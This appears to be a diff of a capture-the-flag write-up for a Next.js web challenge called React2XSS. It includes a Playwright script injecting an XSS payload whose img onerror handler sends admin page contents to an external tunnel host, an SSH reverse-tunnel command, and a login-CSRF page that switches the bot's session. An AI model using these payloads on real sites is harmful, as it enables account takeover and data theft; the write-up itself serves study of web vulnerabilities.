@@ -2,8 +2,8 @@
 
 ## Challenge Overview
 
-- **Challenge:** React2XSS  
-- **Category:** Web (XSS)  
+- **Challenge:** React2XSS
+- **Category:** Web (XSS)
 - **Connection:** http://chal.polyuctf.com:46564 (This is the port number I will reference throughout the writeup, this can be replaced with the actual port)
 - **Description:** "I vibe coded a Next.js application. Hopefully it doesn't have any vulnerabilities"
 
@@ -68,14 +68,14 @@ export async function visitUrl(urlToVisit: string): Promise<boolean> {
   const browser = await chromium.launch(browserArgs);
   const context = await browser.newContext();
   const page = await context.newPage();
-  
+
   // Bot logs in as admin FIRST
   await page.goto(`${BOT_CONFIG.APPURL}/login`, { waitUntil: 'load' });
   await page.fill('input[id="username"]', ADMIN_USERNAME);
   await page.fill('input[id="password"]', adminUser.password);
   await page.click('button[type="submit"]');
   await sleep(BOT_CONFIG.WAIT_AFTER_LOGIN);
-  
+
   // Then visits our URL
   await page.goto(urlToVisit, { waitUntil: 'load' });
   await sleep(BOT_CONFIG.WAIT_AFTER_VISIT);
@@ -153,19 +153,19 @@ const { chromium } = require('playwright');
 
   // Navigate to settings
   await page.goto("http://chal.polyuctf.com:46564/account/settings");
-  
+
   // Intercept and modify the API request
   await page.route('**/api/profile/update', route => {
     const request = route.request();
     const postData = JSON.parse(request.postData());
-    
+
     // Inject our XSS payload
     postData.viewProgressStyle = {
       dangerouslySetInnerHTML: {
         __html: `<img src=x onerror="fetch('https://dcfca0a406d827.lhr.life/flag?data='+btoa(window.open('','winB').document.documentElement.outerHTML))">`
       }
     };
-    
+
     route.continue({ postData: JSON.stringify(postData) });
   });
 
@@ -204,24 +204,24 @@ ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 nokey@localhost.run
 <html>
 <body>
   <h1>Exploit loading...</h1>
-  
+
   <!-- Step 2: Login form to switch bot to attacker account -->
-  <form id="loginForm" action="http://localhost:3000/api/auth/login" 
+  <form id="loginForm" action="http://localhost:3000/api/auth/login"
         method="POST" target="winC" enctype="text/plain">
-    <input type="hidden" 
-           name='{"username":"syjc","password":"password123","a":"' 
+    <input type="hidden"
+           name='{"username":"syjc","password":"password123","a":"'
            value='"}'>
   </form>
-  
+
   <script>
     // Step 1: Open admin's profile API in winB
     // The bot is logged in as admin, so this returns admin's data (including flag)
     let winB = window.open('http://localhost:3000/api/profile', 'winB');
-    
+
     setTimeout(() => {
       // Step 2: Submit login form to switch to attacker account
       document.getElementById('loginForm').submit();
-      
+
       setTimeout(() => {
         // Step 3: Navigate to attacker's homepage
         // This triggers our XSS payload which reads winB (still showing admin data!)
